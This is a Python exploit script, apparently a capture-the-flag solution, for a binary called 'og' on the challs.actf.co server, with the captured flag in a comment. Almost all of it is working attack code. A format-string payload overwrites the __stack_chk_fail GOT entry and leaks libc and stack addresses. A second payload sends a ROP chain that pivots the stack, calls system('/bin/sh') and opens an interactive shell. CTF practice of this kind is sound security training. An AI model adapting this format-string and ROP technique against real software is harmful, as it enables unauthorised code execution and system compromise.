#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './og'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challs.actf.co', 'port':31312})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_scf        = binf.got['__stack_chk_fail']
addr_start          = binf.sep_function['_start']
addr_ret            = 0x40101a

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_write          = libc.sep_function['write']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    exploit  = f'%{rop.ret.address & 0xff}c%9$hhn!%3$p %19$p!'.encode()
    exploit  = exploit.ljust(0x18, b'\x00')
    exploit += p64(addr_got_scf)
    exploit  = exploit.ljust(0x38, b'\x00')
    exploit += p64(addr_start)

    conn.sendlineafter(b'name: ', exploit)

    conn.recvuntil(b'!')
    leak = list(map(lambda x: int(x, 16), conn.recvuntil(b'!', drop=True).split()))

    addr_libc_write = leak[0] - 0x17
    libc.address = addr_libc_write - ofs_libc_write
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    addr_stack = leak[1]
    info('addr_stack        = 0x{:012x}'.format(addr_stack))

    rop = ROP(libc)
    rop.leave = rop.find_gadget(['leave', 'ret'])
    rop.system(addr_libc_str_sh)

    exploit  = bytes(rop)
    exploit  = exploit.ljust(0x30, b'\x00')
    exploit += flat(addr_stack - 0x270, rop.leave.address)
    conn.sendlineafter(b'name: ', exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # actf{you_really_thought_you_could_overwrite_printf_with_system_huh}

if __name__=='__main__':
    main()

#==========
